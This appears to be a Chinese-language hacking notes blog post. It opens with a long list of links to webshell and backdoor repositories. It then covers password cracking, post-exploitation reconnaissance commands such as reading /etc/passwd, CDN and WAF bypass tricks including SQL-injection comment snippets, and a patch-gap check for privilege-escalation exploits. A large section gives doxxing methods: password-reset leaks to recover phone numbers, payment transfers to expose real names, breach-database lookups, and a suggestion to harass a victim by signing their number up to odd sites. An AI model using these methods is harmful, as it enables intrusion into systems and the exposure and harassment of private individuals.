https://github.com/WangYihang/Webshell-Sniper PyWebshell

https://github.com/pm2-hive/pm2-webshell Fully capable Webshell

https://github.com/samdark/yii2-webshell

https://github.com/b1ueb0y/webshell

https://github.com/oneoneplus/webshell webshell收集与整理

https://github.com/zhaojh329/xterminal xTerminal is a remote web shell tool for multi terminal devices.

https://github.com/juanparati/Webshell A remote execution tool (or security intrusion tool)

https://github.com/wofeiwo/webshell-find-tools 分析web访问日志以及web目录文件属性，用于根据查找可疑后门文件的相关脚本。

https://github.com/abcdlzy/webshell-manager

一句话木马管理工具

https://github.com/alert0/webshellch 中国菜刀jsp端

https://github.com/needle-wang/jweevely a exec jsp shell, simply like weevely php C/S shell.

https://github.com/tengzhangchao/PyCmd

加密隐形一句话木马

https://github.com/0x73686974/WebShell Stealth WebShell AntiLogging

https://github.com/wonderqs/Blade A webshell connection tool with customized WAF bypass payloads

https://github.com/le4f/aspexec

asp命令执行webshell

https://github.com/jijinggang/WebShell Go语言Run predefined shell script through web browser

https://github.com/matiasmenares/Shuffle WebShell Backdoor Framework

https://github.com/Skycrab/PySpy https://github.com/huge818/webshell 这是一个网页版本的xshell

https://github.com/gb-sn/go-webshell A simple webshell written in Go

https://github.com/BlackHole1/Fastener Web版webshell

https://github.com/blackhalt/WebShells

https://github.com/tomas1000r/webshell

https://github.com/hanzhibin/Webshell This provide a bash like web tool for Hamsta.

https://github.com/decebel/webShell commanline web shell UI

https://github.com/Aviso-hub/Webshell Webshell interface

https://github.com/vnhacker1337/Webshell

https://github.com/bittorrent3389/Webshell php webshell

https://github.com/anhday22/WebShell webshell

https://github.com/buxiaomo/webshell WebShell Web 管理平台

https://github.com/z3robat/webshell https://github.com/n3oism/webshell 新webshell

https://github.com/uuleaf/WebShell 网站木马

https://github.com/onefor1/webshell 冷门Webshell

https://github.com/cunlin-yu/webshell Collected some useful webshell from the wide.

https://github.com/roytest1/webshell

https://github.com/backlion/webshell webshell合集 22天前更新

https://github.com/opetrovski/webshell https://github.com/opetrovski/webshell 管理工具

https://github.com/gsmlg/webshell

https://github.com/health901/webshell

PHP webshell控制台

https://github.com/inof8r/WebShell Android Webview wrapper

https://github.com/Najones19746/webShell pywebshell

https://github.com/RaspiCar/WebShell C WEBSHELL

https://github.com/health901/webshell PHP Web Shell 控制台

https://github.com/dinamsky/WebShell webshell合集

https://github.com/Fay48/WebShell https://github.com/tuz358/webshell 后门

https://github.com/shajf/Webshell https://github.com/t17lab/WebShell Web Shell

https://github.com/blacksunwen/webshell 这是一个webshell收集项目

https://github.com/webshellarchive/webshellco webshell收集

https://github.com/lolwaleet/Rubshell

ruby shell

https://github.com/WhiteWinterWolf/WhiteWinterWolf-php-webshell https://github.com/goodtouch/jruby-webshell

https://github.com/maestrano/webshell-server

https://github.com/LuciferoO/webshell-collector

https://github.com/wangeradd1/myWebShell 一些比较冷门或者特殊的webshell脚本、jar包、war包


https://github.com/alintamvanz/1945shell 1945 Shell adalah project webshell backdoor yang rilis setiap tahun (17 Agustus). dan rilis build setiap bulan

https://github.com/Venen0/vshell VenenoShell is a PHP based webshell that let you manage a web server. You can create, modify and delete files on it.

https://github.com/lojikil/tinyshell super tiny remote webshell with some helpers. Not trying to hide anything, just a simple shell

https://github.com/wso-shell/PHP-SHELL-WSO https://github.com/meme-lord/PHPShellBackdoors

https://github.com/Learn2Better/51mp3L-Web-Backdoor PHP WebShell Backdoor for Access all dir/file in the Website.

https://github.com/yuxiaokui/JBoss-Hack 通过调用zoomeye来获取安装JBoss机器的地址，然后通过HEAD请求植入webshell。

https://github.com/SecurityRiskAdvisors/cmd.jsp A super small jsp webshell with file upload capabilities.

https://github.com/ddcunningham/crude-shellhunter Fooling with AWK to remove webshells injected into client code.

https://github.com/stormdark/BackdoorPHP

https://github.com/vduddu/Malware

https://github.com/1oid/BurstPHPshell 破解webshell

https://github.com/gokyle/urlshorten_ng URL shortening service based on 'webshell'.

https://github.com/rhelsing/trello_osx Na(t)ive Trello implementation for OS X, using WebShell

https://github.com/pfrazee/wsh-grammar WebShell grammer definition, and parser

https://github.com/x-o-r-r-o/PHP-Webshells-Collection Most Wanted Private and Public PHP Web Shells Can Be Downloaded Here. (Educational Purpose Only)

https://github.com/IHA114/WebShell2

https://github.com/WangYihang/WebShellCracker https://github.com/KINGSABRI/WebShellConsole

https://github.com/jujinesy/webshells.17.03.18

https://github.com/hackzsd/HandyShells Some Handy WebShell Scripts

https://github.com/mperlet/pomsky python web shell

https://github.com/cybernoir/bns-php-shell Basic and Stealthy PHP webshell

https://github.com/XianThi/rexShell php backdoor, webshell

https://github.com/H4CK3RT3CH/php-webshells

https://github.com/minisllc/subshell

SubShell is a python command shell used to control and execute commands through HTTP requests to a webshell. SubShell acts as the interface to the remote webshells.

https://github.com/linuxsec/indoxploit-shell Webshell with unique features

https://github.com/kuniasahi/mpshell 一个简单的phpwebshell

https://github.com/datasiph0n/MyBB-Shell-Plugin https://github.com/magicming200/evil-koala-php-webshell 邪恶考拉php webshell。

https://github.com/0xK3v/Simple-WebShell

https://github.com/djoq/docker-pm2-webshell SSH access to a docker virtual machine via browser.

https://github.com/SMRUCC/GCModeller.WebShell GCModeller web user interface

https://github.com/darknesstiller/WebShells Proyecto para revisión de funcionalidades de WebShells

https://github.com/devilscream/remoteshell Simple Webshell based on Terminal.

https://github.com/0verl0ad/gorosaurus

https://github.com/grCod/poly A python script that generates polymorphic webshells.

https://github.com/cryptobioz/wizhack Get shellcodes and webshells quickly.

https://github.com/amwso/docker-webshell b374k webshell in docker

https://github.com/William-Hunter/JSP_Webshell 一个简单的使用jsp实现DB CRUD 操作的webshell模拟

https://github.com/yangbaopeng/ashx_webshell ashx_webshell

https://github.com/webshellpub/awsome-webshell webshell样本大合集。收集各种webshell用于webshell分析与发现。

https://github.com/noalh8t/simple-webshell

https://github.com/s3cureshell/wso-2.8-web-shell WSO 2.8.5 webshell

https://github.com/LiamRandall/simpleexec A simple webshell in Go.

https://github.com/Samorodek/humhub-modules-webshell Simple web shell.

https://github.com/mwambler/webshell-xpages-ext-lib

https://github.com/AVGP/Wesh The JS Webshell

https://github.com/edibledinos/weevely3-stealth

Weevely is a command line web shell dynamically extended over the network at runtime, designed for remote server administration and penetration testing.

https://github.com/lehins/haskell-webshell SSH Webshell in Haskell

https://github.com/guglia001/php-secure-remove https://github.com/gokyle/webshell_tutorial Tutorial site for webshell.

https://github.com/azmanishak/webshell-php Webshell PHP library

https://github.com/andrefernandes/docker-webshell docker-webshell

https://github.com/codehz/node-webshell

https://github.com/koolshare/merlin-webshell merlin_thunder

https://github.com/StephaneP/erl-webshell

https://github.com/jjjmaracay3/webshells asp,aspx,php,jsp,pl,py 各种webshell

https://github.com/grCod/webshells

https://github.com/ian4hu/bootshell A JSP WebShell with bootstrap.

https://github.com/Ghostboy-287/wso-webshell

WSO php webshell

https://github.com/xiaoxiaoleo/xiao-webshell a collection of webshell

https://github.com/alexbires/webshellmanagement manage all the shells

https://github.com/codeT/collectWebShell collect common webshell

https://github.com/PhilCodeEx/jak3fr0z

https://github.com/Ettack/WebshellCCL 辅助过安全狗

https://github.com/jubal-R/TinyWebShell A simple php web shell and client with an interactive console for use in CTFs, wargames, etc. The goal is to keep the web shell tiny by moving as much code as possible to the client side.

https://github.com/CaledoniaProject/AxisInvoker A minimal webshell for Apache AXIS2

https://github.com/theBrianCui/ISSS_webShell The official website (source) of the Information & Systems Security Society.

https://github.com/webshell/webshell-node-sdk The easiest way to use Webshell in javascript using Node.js

https://github.com/Medicean/AS_BugScan

通过 Webshell 创建 BugScan 节点(需要目标支持 Python2.7)

https://github.com/3xp10it/xwebshell

免杀webshell

https://github.com/niemand-sec/RazorSyntaxWebshell Webshell for Razor Syntax (C#)

https://github.com/LuciferoO/webshell-collector This is a webshell collector project

https://github.com/0verl0ad/HideShell A tool to ofuscate big webshells (c99, r57...). Can hide your webshell from AV, LMD, Neopi, Web Shell Detector, etc.

https://github.com/L-codes/oneshellcrack oneshellcrack 是一个非常快的webshell暴力破解工具

https://github.com/ArchAssault-Project/webshells webshells repo for arch assault

https://github.com/AndrHacK/andrshell DDoS WEB SHELL - PYTHON3

## 密码

https://www.somd5.com/

### windows密码获取和破解

windows系统中的Hash密码值主要是有LM-hash值和NTLM-hash值两部分组成。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507183037290.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507183318804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507232418369.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507232911388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507234519141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### Linux密码获取和破解

当你获得了shadow文件中的root加密值，如果想不到如何破解请看此小节。

## 后渗透

如果你是一位安全工程师，那么可能后渗透只需要了解常见用法即可。但如果你想做出一些反常的事情，比如你期望打穿内网或试试能拿多少数据出来，那么后渗透尤其重要。

### 后渗透收集内网信息

### 提权、渗透内网、永久后门。

## 感染

## 费时：全方位挖掘策略

**常见手段**
对于网页的漏洞也许不存在，但你下载APP也许很简单的测试出来了

## 信息收集

### 源码分析

越详细的即：还附带版本号的，得到这种信息可以直接百度或者shodan 
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629203444169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629204318419.png)

### 获得shell后信息收集

last：查看登录成功日志
cat ~/.bash_history  ：查看操作指令
ps -aux  #查看进程
cat /etc/passwd

### 溯源

这个技巧可以用在获得更多信息中或者人肉，也可以用在反攻击中，即找出黑客是谁。
![在这里插入图片描述](https://img-blog.csdnimg.cn/202107011702168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 很强大的溯源工具

https://www.feiliuwl.cn/go/?url=http://qb-api.com/ 或者 https://qb-api.com   本站更换主域名为sgk.xyz！！
18781615044
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210616113445248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701170010902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


这个网站找到电话也可以 https://pig8.iculture.cc/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701170650470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701170520497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 已知名字

https://cn.linkedin.com/pub/dir?lastName=&firstName=名&trk=public_profile_people-search-bar_search-submit

#### 已知邮箱

##### 获取电话号码

也可以先用reg007找到公开的注册网站。记住记住！！！有的网站可能会在在你没有准备下一步要发送密码时，就已经发送邮箱或者短信了，无疑会打草惊蛇，因此你需要先用你的账号密码进行测试。
通过“密码找回”获取手机号片段：

大多数人会使用相同的邮箱相同的手机号注册微信、[微博](https://security.weibo.com/iforgot/loginname?entry=weibo&loginname=%E9%82%AE%E7%AE%B1/%E4%BC%9A%E5%91%98%E5%B8%90%E5%8F%B7/%E6%89%8B%E6%9C%BA%E5%8F%B7)、京东、淘宝、支付宝、携程、豆瓣、大众点评等应用。在“找回密码”页面输入已知的邮件地址：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609213557341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

我试验了大部分热门应用的密码重置过程，大致如此，有的是前两位后四位，有的是前三位和后两位……。没有标准，屏蔽位数完全由企业和开发人员决定。

第二步：使用公开数据库筛选：

为什么公布个人信息时一般是隐藏中间4位号码？目前我国手机号码格式为：3位网号 +4位HLR识别号+4位用户号码。

 139-1234-5678

其中139代表运营商（移动），5678是用户号码。1234是HSS/HLR识别码，或者叫地区编码，相当于你手机归属地的运营商服务器编号，记录了客户数据，包括基本资料、套餐、位置信息、路由以及业务状态数据等等。比如1391234是移动江苏常州的HLR编号，1301234是联通重庆的HLR编号。

在网上可找到每月更新的手机归属地数据库，字段包括省份、城市、运营商等信息
假如我知道张三常住北京，根据数据库筛选结果，158移动目前北京有230个号段，1580100~1580169,1581000~1581159。

待筛选号码剩下230个。

如果是其他省市，158XXXX，上海有210个，成都有170个，西安有108个。如果是二级城市，范围就更小了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609214656281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609214801690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021060921493650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609215132796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)




小节转载自 https://mp.weixin.qq.com/s?__biz=MzI3NTExMDc0OQ==&mid=2247483802&idx=1&sn=e4317bcbc3e78ddf4c2715298ef197f2&scene=21#wechat_redirect

#### 网站信息查询

接下来，查询一下whois信息：信息查询出来后没有注册电话显示，还需要进一步查询。
邮箱反查
通过whois查询到的邮箱进行一波反查注册过该邮箱域名地址：发现该邮箱还注册了另一个站点。

相关网站
对邮箱反查后的站点进行访问后得到。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520164745383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### IP 定位
118.112.11.101
**IP**

1. 高精度 IP 定位：https://www.opengps.cn/Data/IP/LocHighAcc.aspx
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701231210744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


3. ipplus360 （IP 查询）：http://www.ipplus360.com/ip/
4. IP 信息查询：https://www.ipip.net/ip.html/
5. IP 地址查询在线工具：https://tool.lu/ip/

#### 已知电话号码

**查姓名**
可直接搜索支付宝
如果你不介意被对方发现，你可以直接通过支付宝转账，使用银行卡付款。
然后在你的银行卡客户端查询订单，订单详情的支付场所：XXX，会显示对方的全名
社交账户：（微信、QQ）等
注意：获取手机号如果自己查到的信息不多，直接上报钉钉群（利用共享渠道对其进行二次社工）

通过手机号查询他注册了哪些网站 http://www.newx007.com/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210615201723930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
等于获得了微信

##### 查询社交账号

**qq号**
接口地址：https://cxx.yun7.me/qqphone
返回格式：json
请求方式：get/post
请求示例：https://cxx.yun7.me/qqphone?phone=18888888888
请求参数说明：

返回示例：

{
	"status": 200,
	"message": "查询成功",
	"qq": "336699",
	"phone": "18888888888",
	"phonediqu": "福建省金门市移动"
}

#### 社交账号

##### 查询照片EXIF

https://www.gaitubao.com/exif

#### 已知QQ号

```
https://qq.pages.dev/
```

通过QQ邮箱和QQ号搜索支付宝、淘宝账号等其他可能的常用平台
去腾讯\新浪微博搜索
通过微信搜索
查看QQ空间\相册\地区\星座\生日\昵称(后续构建字典以及跨平台搜集)
通过说说、留言、日志找到其好友
加QQ钓鱼\共同好友\可能认识的人

##### 查询地址

https://www.iculture.cc/sg/pig=291

##### 查询电话号

qq点找回密码，其他与前文已知邮箱操作相同

你获得这个人电话了，要是想恶搞他就用他号码注册n个奇怪的网站，账号名还用实名。哈哈哈

##### 加被害者

钓鱼，查询对方上网地址 https://jingyan.baidu.com/article/6181c3e084fb7d152ef15385.html

#### 社工库

笔者这一节花了不少时间，因为资源太少。对于定向攻击或者人肉通过公开的社工库可能就是海底捞针了，但是反向思维通过泄露的数据去攻击某个人，那将会容易得多。
 http://site3.sjk.space/# 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210506174808635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
5e
5e指的是微博泄露的5亿微博uid与绑定手机相关联的数据
准确的5e是503925366条数据

8e
8e指的是QQ泄露的8亿QQ与初始绑定手机相关联的数据
准确的8e是有719806832条数据

16e
16e指的是整合的16亿数据
市面上没有纯16亿的QQ数据

如果声称有的100%是骗子
大概组成
4亿老密码和4亿QQ绑定的数据
8亿邮箱绑定的数据（包括手机和密码）

在线社工库
https://www.iculture.cc/pizzahut

## 绕过CDN

**简要介绍**
试图获取真实ip,对于中小型网站这是简单的，对于大型如百度、腾讯这是几乎不能成功的。小型网站可以尝试用nslookup来查询ip，若返回域名解析结果为多个ip，多半使用了CDN，是不真实的ip。
或者你通过多地ping看返回的ip是否一样来验证是不是有CDN。这个在站长之家的超级ping工具可以获得显示 http://ping.chinaz.com 使用此工具的时候注意你输入ww.XXX.com与XXX.com解析结果很可能是不同的。这取决于管理员对网站的设置。
如下是ww.XXX.com
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629153333683.png)
和XXX.com
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629153405923.png)
看看在后台的设置可以知道
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629153456929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
但如果你用浏览器访问XXX.com，浏览器会自动给你加上www,导致你也许错误认为这两者对于真实的解析没有区别

**真实ip作用**
使用CDN的网站，如果你没有获得其真实的服务器ip地址，那么你对虚假地址的攻击只能是无效工作。虚假地址就像是对真实地址的一个缓存

1. 获取更多信息

> 信息量更多的扫描目录结果。我在测试某站点的一级域名目录与真实IP

3. 做攻击

>可洪水攻击、得到真实IP可以直接进行云WAF绕过；一般来说信息搜集的最主要最靠的步骤就是找出真实IP

**查询方法**
查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：
https://dnsdb.io/zh-cn/
https://x.threatbook.cn/
https://censys.io/ipv4?q=baidu.com
非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。
http://viewdns.info

同样是个令站长十分蛋疼的DNS历史记录网站，记录了几年内的更改记录。
https://site.ip138.com/

庞大的DNS历史数据库，可以查出几年内网站用过的IP、机房信息等。
http://iphostinfo.com
注意：这个网站可以遍历FTP、MX记录和常见二级域名，有些站长喜欢把邮箱服务也放在自己主机上，侧面泄露了真实的IP地址，通过这个网站可以进行检查。

浏览器切换手机模式，可能是真实ip，公众号、小程序中的资产也可能对应真实ip

1. 查询子域名。对子域名进行ip扫描。但这会有三种情况，一种是子域名与主域名同个ip,或同个网段，或完全不同的ip

2. 耗尽CDN资源/以量打量。CDN付费是比如100M流量购买，所以如果你通过请求访问完网站的CDN那么你将会获得真实的ip
3. ip历史记录解析查询法。
   有的网站是后来才加入CDN的，所以只需查询它的解析历史即可获取真实ip，这里我们就简单介绍几个网站：微步在线dnsdb.ionetcraft(http://toolbar.netcraft.com/),Viewdns(http://viewdns.info/)等等。

4. 网站漏洞查找法
   通过网站的信息泄露如phpinfo泄露，github信息泄露，命令执行等漏洞获取真实ip。

5. 网站订阅邮件法
   利用原理：邮件服务器 大部分不会做CDN 利用注册，因为邮箱一般都是给内部人使用的，且一般邮箱都是主动给人发比如找回密码等邮件，当客户邮箱收到你的邮件时这时候会自动同个ip识别是不是垃圾邮件是不是官方邮件。使用方法：找回密码等网站发送邮件进行验证，获取验证码，查看邮件代码获取IP地址。
   如下是foxmail
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629164915844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629165428490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

6. 网络空间引擎搜索法
   常见的有以前的钟馗之眼，shodan(https://www.shodan.io/)，fofa搜索(https://fofa.so/)。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。
   利用网络空间搜索时，你还可以先获取一个网站的ico的hash值，将hash值在空间搜索引擎中查找
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171639945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171847888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


8. F5 LTM解码法
   当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。

9. 国外地址请求

利用原理：开发员认为用户群体主要在国内，因此只针对于中国地区进行cdn防护,没有部署国外访问的CDN的访问节点
(1)利用国外ping对目标进行ping检测（尽量使用少见国家）
(2)利用VPN全局代理利用CMD进行PING检测

如图是使用工具进行多个国家ping结果 https://whoer.net/zh/ping
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629163852104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
https://tools.ipip.net/dns.php
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701225359245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

9. 对网站的APP抓包,
10. 使用全网扫描工具比如：fuckcdn,w8fuckcdn,zmap；但是这些工具都不太好用
    首先从 apnic 网络信息中心获取ip段，然后使用Zmap的 banner-grab 对扫描出来 80 端口开放的主机进行banner抓取，最后在 http-req中的Host写我们需要寻找的域名，然后确认是否有相应的服务器响应。

11. 第三方扫描平台，输入链接即可查找  https://get-site-ip.com/
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629160737324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
    或者 https://s.threatbook.cn/![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629161729418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

**最终确认**
你可能通过不同方法查询后将会获得多个ip作为可怀疑对象，这时候你需要最终确认ip所在地

12. 查询ip地址所在地。观察网页归属地。或者更深入你的你应该查询管理员属于哪里人公司位于哪里云云
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629165616321.png)
13. 修改host文件中的www.xxx.com和xxx.com文件，用ping确定后再访问看能否打开网页
14. 直接在网页中访问IP地址  

## WAF

一般的网站都有waf，这是因为不少waf都开放免费端口。市面上有很多waf，但是原理都差不多
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629184325358.png)

很多web都有WAF，会对恶意访问者做一定的拦截和记录
**waf类型**

硬件、软件、云

**waf识别**
简单判断：手工输入之后判断返回包，可以知道是什么类型的wAF或者网站是不是
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507202023138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

2. wafw00f
3. sqlmap
   相较于手工和wafw00f而言，sqlmap业界认可度更高，用的人更多

```bash
sqlmap.py -u "url" --identify-waf --batch
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021050720372368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507203734428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
某些站点从源码也能看出是什么waf
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629210702831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


**WAF绕过**

多重关键字；
使用注释如`union /*2222*/select /*222*/1,2`
生僻函数在报错注入中使用ploygon()来替换updatexml()
寻找网站真正IP,只有找到真正ip就可以绕过云IP检测![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507204058143.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507204406562.png)

## 待补充：横向渗透

## 待补充：提权

### windows

**查找windows未打补丁的漏洞**
微软官方时刻关注列表网址：
https://technet.microsoft.com/zh-cn/library/security/dn639106.aspx
比如常用的几个已公布的exp：KB2592799，KB3000061，KB2592799等。
快速查找未打补丁的exp，可以最安全的减少目标机的未知错误，以免影响业务。
命令行下执行检测未打补丁的命令如下：

```bash
systeminfo>micropoor.txt&(for %i in (  KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061   KB3045171 KB3077657 KB3079904 KB3134228 KB3143141  KB3141780 ) do @type micropoor.txt|@find /i  "%i"|| @echo
%i you can fuck)&del /f /q /a micropoor.txt
```

注：以上需要在可写目录执行。需要临时生成micrpoor.txt，以上补丁编号请根据环境来增删





## 批量刷漏洞

利用好空间搜索引擎，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞，去fofa,shodan上搜会比较快。

# 待补充：实战经验

## 拿到一个网站需测试

扫描网站开放的端口
网站交互看代码回显

## 网站raw修改

### cookie

一些网站会利用 Cookie 是否为空、Session 是否为 true 来判断用户是否可以登录，只要构造一个 Cookie 或 Session 为 true 就可以绕过认证登录

通过修改 Cookie 中的某个参数来实现登录其他用户,要抓包具体分析

## 爆破情况

>账号不存在
>密码

实战经验包括自己的和取自前辈们的案例。常见的漏洞点

1、修改个人资料、邮箱、密码、头像

2、发表文章

3、添加、删除评论

4、添加、修改、删除收货地址

5、添加管理员

## 网站回显

你应该对网站交互界面仔细查看


## 漏洞易发现模块

攻击模块里文件上传

### 后台登录页面

